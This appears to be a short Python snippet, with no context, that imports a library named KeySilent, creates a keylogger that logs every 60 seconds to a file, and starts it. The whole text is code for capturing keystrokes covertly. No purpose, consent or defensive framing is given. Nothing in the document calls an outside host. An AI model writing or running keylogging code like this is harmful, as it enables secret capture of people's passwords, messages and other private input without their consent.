import KeySilent

keylogger = KeySilent.Keylogger(interval=60, report_method="file")
keylogger.start()